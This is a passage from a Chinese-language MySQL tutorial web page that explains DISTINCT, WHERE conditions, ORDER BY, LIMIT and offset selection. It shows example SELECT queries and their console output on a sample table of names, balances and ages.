operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> 郭德纲    <span class="token operator">|</span>     <span class="token number">212</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token number">12</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-3-查询单个字段不重复记录-distinct"><font color="#3CB371" face="Comic sans MS">11.3 查询单个字段不重复记录 distinct</font><a href="post/MySQL-Primer#11-3-查询单个字段不重复记录-distinct"></a></h4><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select distinct 字段 from 表;</td></tr><tr><td align="center">示例</td><td align="left">select distinct age deptno from money;</td></tr><tr><td align="center">示例说明</td><td align="left">查询money表中年龄唯一的所有结果</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select distinct age deptno from money<span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span> deptno <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>     <span class="token number">29</span> <span class="token operator">|</span><span class="token operator">|</span>     <span class="token number">40</span> <span class="token operator">|</span><span class="token operator">|</span>     <span class="token number">27</span> <span class="token operator">|</span><span class="token operator">|</span>     <span class="token number">43</span> <span class="token operator">|</span><span class="token operator">|</span>     <span class="token number">63</span> <span class="token operator">|</span><span class="token operator">|</span>     <span class="token number">30</span> <span class="token operator">|</span><span class="token operator">|</span>     <span class="token number">36</span> <span class="token operator">|</span><span class="token operator">|</span>     <span class="token number">44</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token number">8</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-4-条件查询-where"><font color="#3CB371" face="Comic sans MS">11.4 条件查询 where</font><a href="post/MySQL-Primer#11-4-条件查询-where"></a></h4><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select  字段 from 表 where where条件;</td></tr><tr><td align="center">示例</td><td align="left">select * from money where age = 29;</td></tr><tr><td align="center">示例说明</td><td align="left">查询money表中年龄为29的所有结果</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token operator">*</span> from money where age <span class="token operator">=</span> <span class="token number">29</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> id <span class="token operator">|</span> username  <span class="token operator">|</span> balance <span class="token operator">|</span> province <span class="token operator">|</span> age <span class="token operator">|</span> sex <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> 李文凯    <span class="token operator">|</span>  <span class="token number">120.02</span> <span class="token operator">|</span> 湖北     <span class="token operator">|</span>  <span class="token number">29</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> 刘诗诗    <span class="token operator">|</span>     <span class="token number">456</span> <span class="token operator">|</span> 北京     <span class="token operator">|</span>  <span class="token number">29</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token number">2</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="red"><strong>where后可接的条件</strong></font><br><font color="#00B2EE"><strong>比较运算符</strong></font><br>比较运算符结果集中将符合条件的记录列出来。上面的例子中，where 后面的田间是一个字段的 ‘=’。<br>除此之外，还可以使用<strong>&gt;、&lt;、&gt;=、&lt;=、!=</strong>等比较运算符；</p><p>&emsp;<br><font color="#00B2EE"><strong>逻辑运算符</strong></font><br>多个条件还可以使用 or 、 and 等逻辑运算符进行多条件联合查询<br><strong>or   或者<br>and       并且</strong></p><p>&emsp;<br>我们来看一下多个条件的例子：<br><font color="#00B2EE"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细内容</th></tr></thead><tbody><tr><td align="center">示例</td><td align="left">select * from money where id &lt;10 and</td></tr><tr><td align="center">说明</td><td align="left">查询所有字段 要求id小于10 并且province=’湖北’</td></tr></tbody></table></div></div><p><font color="#00B2EE"></font></p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token operator">*</span> from money where id <span class="token operator">&lt;</span><span class="token number">10</span> <span class="token keyword">and</span> province<span class="token operator">=</span><span class="token string">'湖北'</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> id <span class="token operator">|</span> username  <span class="token operator">|</span> balance <span class="token operator">|</span> province <span class="token operator">|</span> age <span class="token operator">|</span> sex <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span>  <span class="token number">120.02</span> <span class="token operator">|</span> 湖北     <span class="token operator">|</span>  <span class="token number">29</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">1</span> row in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-5-结果集排序"><font color="#3CB371" face="Comic sans MS">11.5 结果集排序</font><a href="post/MySQL-Primer#11-5-结果集排序"></a></h4><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 字段 from 表 order  by 字段 排序关键词</td></tr><tr><td align="center">示例</td><td align="left">select id,username, balance from money order by balance desc;</td></tr><tr><td align="center">示例说明</td><td align="left">查询money表中的id,username,balance字段，按照余额进行降序排序</td></tr></tbody></table></div></div><p>&emsp;<br>排序用到的关键词：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">关键词</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">asc</td><td align="left">升序排列，从小到大（默认）</td></tr><tr><td align="center">desc</td><td align="left">降序排列，从大到小</td></tr></tbody></table></div></div><blockquote><p>在 select 出来之后的结果集中排序使用 order by ，其中 desc 和 asc 是排序顺序中的关键字。<font color="#FF7F00"><strong>desc 表示按照字段进行降序排列，asc 表示升序排列，如果不写关键字默认升序排列。</strong></font></p></blockquote><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select id<span class="token punctuation">,</span>username<span class="token punctuation">,</span> balance from money order by balance desc<span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> id <span class="token operator">|</span> username  <span class="token operator">|</span> balance <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> 赵本山    <span class="token operator">|</span>    <span class="token number">3456</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">4</span> <span class="token operator">|</span> 井柏然    <span class="token operator">|</span>     <span class="token number">810</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> 刘诗诗    <span class="token operator">|</span>     <span class="token number">456</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">6</span> <span class="token operator">|</span> 成龙      <span class="token operator">|</span>     <span class="token number">313</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> 范冰冰    <span class="token operator">|</span>  <span class="token number">260.23</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> 郭德纲    <span class="token operator">|</span>     <span class="token number">212</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> 黄晓明    <span class="token operator">|</span>  <span class="token number">150.86</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">7</span> <span class="token operator">|</span> 杨幂      <span class="token operator">|</span>     <span class="token number">123</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span>  <span class="token number">120.02</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">11</span> <span class="token operator">|</span> 汪峰      <span class="token operator">|</span>   <span class="token number">34.32</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">9</span> <span class="token operator">|</span> 柳岩      <span class="token operator">|</span>    <span class="token number">23.4</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">5</span> <span class="token operator">|</span> 李冰冰    <span class="token operator">|</span>   <span class="token number">20.15</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token number">12</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-6-多字段排序"><font color="#3CB371" face="Comic sans MS">11.6 多字段排序</font><a href="post/MySQL-Primer#11-6-多字段排序"></a></h4><p>order by 后面可以跟多个不同的字段排序，并且排序字段的不同结果集的顺序也不同，如果排序字段的值一样，则值相同的字段按照第二个排序字段进行排序。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 字段 from 表 order  by 字段1 排序关键词,… …字段n desc</td></tr><tr><td align="center">示例</td><td align="left">select id,username, balance from money order by balance desc,age asc;</td></tr><tr><td align="center">示例说明</td><td align="left">查询money表中的id,username,balance字段，按照余额进行降序排序,若余额全都一样，则再使用age进行升序排序</td></tr></tbody></table></div></div><blockquote><p>注：如果第一个字段已经将结果给排好。第二个字段排序字段不生效。本例中，第二个字段无效</p></blockquote><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select id<span class="token punctuation">,</span>username<span class="token punctuation">,</span> balance from money order by balance desc<span class="token punctuation">,</span>age asc<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> id <span class="token operator">|</span> username  <span class="token operator">|</span> balance <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> 赵本山    <span class="token operator">|</span>    <span class="token number">3456</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">4</span> <span class="token operator">|</span> 井柏然    <span class="token operator">|</span>     <span class="token number">810</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> 刘诗诗    <span class="token operator">|</span>     <span class="token number">456</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">6</span> <span class="token operator">|</span> 成龙      <span class="token operator">|</span>     <span class="token number">313</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> 范冰冰    <span class="token operator">|</span>  <span class="token number">260.23</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> 郭德纲    <span class="token operator">|</span>     <span class="token number">212</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> 黄晓明    <span class="token operator">|</span>  <span class="token number">150.86</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">7</span> <span class="token operator">|</span> 杨幂      <span class="token operator">|</span>     <span class="token number">123</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span>  <span class="token number">120.02</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token number">11</span> <span class="token operator">|</span> 汪峰      <span class="token operator">|</span>   <span class="token number">34.32</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">9</span> <span class="token operator">|</span> 柳岩      <span class="token operator">|</span>    <span class="token number">23.4</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">5</span> <span class="token operator">|</span> 李冰冰    <span class="token operator">|</span>   <span class="token number">20.15</span> <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">12</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-7-结果集限制"><font color="#3CB371" face="Comic sans MS">11.7 结果集限制</font><a href="post/MySQL-Primer#11-7-结果集限制"></a></h4><p>对于查询或者排序后的结果集，如果希望只显示一部分而不是全部，使用 limit 关键字结果集数量限制。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 字段 from 表  limit 数量;</td></tr><tr><td align="center">示例</td><td align="left">select id,username, balance from money limit 5;</td></tr><tr><td align="center">示例说明</td><td align="left">显示前五个用户</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span>  select <span class="token operator">*</span> from money limit <span class="token number">5</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> id <span class="token operator">|</span> username  <span class="token operator">|</span> balance <span class="token operator">|</span> province  <span class="token operator">|</span> age <span class="token operator">|</span> sex <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span>  <span class="token number">120.02</span> <span class="token operator">|</span> 湖北      <span class="token operator">|</span>  <span class="token number">29</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> 范冰冰    <span class="token operator">|</span>  <span class="token number">260.23</span> <span class="token operator">|</span> 山东      <span class="token operator">|</span>  <span class="token number">40</span> <span class="token operator">|</span>   <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> 黄晓明    <span class="token operator">|</span>  <span class="token number">150.86</span> <span class="token operator">|</span> 山东      <span class="token operator">|</span>  <span class="token number">40</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">4</span> <span class="token operator">|</span> 井柏然    <span class="token operator">|</span>     <span class="token number">810</span> <span class="token operator">|</span> 辽宁      <span class="token operator">|</span>  <span class="token number">27</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">5</span> <span class="token operator">|</span> 李冰冰    <span class="token operator">|</span>   <span class="token number">20.15</span> <span class="token operator">|</span> 黑龙江    <span class="token operator">|</span>  <span class="token number">43</span> <span class="token operator">|</span>   <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token number">5</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-8-限制结果集并排序"><font color="#3CB371" face="Comic sans MS">11.8 限制结果集并排序</font><a href="post/MySQL-Primer#11-8-限制结果集并排序"></a></h4><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 字段 from 表 order by 字段 关键词 limit 数量</td></tr><tr><td align="center">示例</td><td align="left">select id,username, balance from money order by balance desc limit 5;</td></tr><tr><td align="center">示例说明</td><td align="left">按照钱来排序，显示前五个最有钱的用户</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select id<span class="token punctuation">,</span>username<span class="token punctuation">,</span> balance from money order by balance desc limit <span class="token number">5</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> id <span class="token operator">|</span> username  <span class="token operator">|</span> balance <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> 赵本山    <span class="token operator">|</span>    <span class="token number">3456</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">4</span> <span class="token operator">|</span> 井柏然    <span class="token operator">|</span>     <span class="token number">810</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> 刘诗诗    <span class="token operator">|</span>     <span class="token number">456</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">6</span> <span class="token operator">|</span> 成龙      <span class="token operator">|</span>     <span class="token number">313</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> 范冰冰    <span class="token operator">|</span>  <span class="token number">260.23</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token number">5</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-9-结果集区间选择"><font color="#3CB371" face="Comic sans MS">11.9 结果集区间选择</font><a href="post/MySQL-Primer#11-9-结果集区间选择"></a></h4><p>假设我从第0条开始取了3条记录。又想再从第3条开始取3条记录。再想从第6条开始取4条记录怎么办？<br>这时候就需要使用到结果集区间选择。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 字段 from 表  limit 偏移量,数量</td></tr><tr><td align="center">示例</td><td align="left">select id,username, balance from  money limit 0,3;</td></tr><tr><td align="center">示例说明</td><td align="left">从第一条开始取三条记录</td></tr></tbody></table></div></div><p>注：第一条记录为0。</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select id<span class="token punctuation">,</span>username<span class="token punctuation">,</span> balance from  money limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> id <span class="token operator">|</span> username  <span class="token operator">|</span> balance <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span>  <span class="token number">120.02</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> 范冰冰    